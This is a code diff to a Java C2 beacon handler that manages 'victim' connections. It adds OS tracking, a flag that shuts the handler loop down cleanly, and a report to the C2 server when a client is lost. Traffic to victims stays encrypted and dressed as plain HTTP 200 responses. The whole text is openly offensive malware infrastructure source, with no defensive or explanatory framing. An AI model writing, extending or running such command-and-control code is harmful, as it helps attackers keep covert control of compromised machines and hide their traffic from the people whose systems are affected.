@@ -7,6 +7,8 @@ public class BeaconClientHandler implements Runnable{
     private String IPAddress;
     private Duplexer duplexer;
     private BeaconServer beaconServer;
+    private String os;
+    private Boolean sentinel = true;
 
     /**
      * Use this Class to create a new thread to handle each victim connection
@@ -14,10 +16,11 @@ public class BeaconClientHandler implements Runnable{
      * @param IPAddress IP address of the client (victim)
      * @param duplexer Pointer to the duplexer so that this thread can receive messages from the victim.
      */
-    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer){
+    protected BeaconClientHandler(String IPAddress, Duplexer duplexer, BeaconServer beaconServer, String os){
         this.IPAddress = IPAddress;
         this.duplexer = duplexer;
         this.beaconServer = beaconServer;
+        this.os = os;
     }
 
     protected void quit(String reason) throws IOException{
@@ -55,15 +58,17 @@ public class BeaconClientHandler implements Runnable{
      * @param message Message to be sent
      */
     protected void sendToClient(String message){
-        message = encrypt(message);
-        String httpHeader = "HTTP/1.1 200 OK\r\n" +  "Content-Length: " + message.length() + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
-        message = httpHeader + message;
-        duplexer.send(message);
+        if(sentinel){
+            message = encrypt(message);
+            String httpHeader = "HTTP/1.1 200 OK\r\n" +  "Content-Length: " + message.length() + "\r\nContent-Type: text/plain; charset=utf-8\r\n\r\n";
+            message = httpHeader + message;
+            duplexer.send(message);
+        }
     }
 
     @Override
     public void run(){
-        while(true){
+        while(sentinel){
             try{
                 String response = duplexer.receive();
                 if(!(response.equals("GET / HTTP/1.1")) && !(response.contains("Content-Length")) && !(response.equals("Content-Type: text/plain; charset=utf-8")) && !(response.isBlank())){
@@ -71,6 +76,8 @@ public class BeaconClientHandler implements Runnable{
                     beaconServer.addDataToResponsesDictionaries(IPAddress, response);
                 }
             } catch (IOException e){
+                sentinel = false;
+                beaconServer.sendDataToC2Server("Lost " + os + " Client at " + IPAddress);
                 e.printStackTrace();
             }
             
